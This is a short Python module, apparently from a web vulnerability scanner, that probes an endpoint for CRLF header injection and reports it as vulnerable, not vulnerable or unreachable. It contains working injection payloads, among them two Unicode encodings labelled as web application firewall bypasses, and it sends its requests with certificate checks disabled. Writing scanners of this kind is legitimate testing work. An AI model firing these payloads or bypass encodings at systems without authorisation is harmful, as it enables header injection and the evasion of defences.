from .linker import *

vuln_msg = "%sVulnerable %s-> %s%s"
safe_msg = "%sNot Vulnerable"
inject_header  = "controlled-header"
inject_value   = "controlled-value"

inject_payloads = [
    "/%0D%0A",    # Basic injection
    "/%E5%98%8A", # WaF bypass
    "/%E5%98%8D"  # WaF bypass
]

def chkcrlf(endpoint,timeout=30):
    url = helpers.urlify(endpoint).as_file
    results = []
    for inject_payload in inject_payloads:
        try:
            request_url = url + "%s%s:%s" % (inject_payload,inject_header,inject_value)
            request = requests.get(request_url, timeout=timeout,verify=False)
            for header_name, header_value in list(request.headers.items()):
                if header_value == inject_value:
                    results.append(["v",vuln_msg % (
                            Fore.GREEN,
                            Fore.YELLOW,
                            Fore.LIGHTWHITE_EX,
                            request_url
                        )])

            if request.history:
                for history in request.history:
                    for header_name, header_value in list(history.headers.items()):
                        if header_value == inject_value:
                            results.append(["v",vuln_msg % (
                                    Fore.GREEN,
                                    Fore.YELLOW,
                                    Fore.LIGHTWHITE_EX,
                                    request_url
                                )])
            
            results.append(["s",safe_msg % (Fore.RED)])

        except Exception as e:
            results.append(["f","%sUnreachable" % (Fore.RED)])

    for result in results:
        status,msg = result
        if status == "v":
            return msg
    else:
        for result in results:
            status,msg = result
            if status == "s":
                return msg
        else:
            for result in results:
                status,msg = result
                if status == "f":
                    return msg

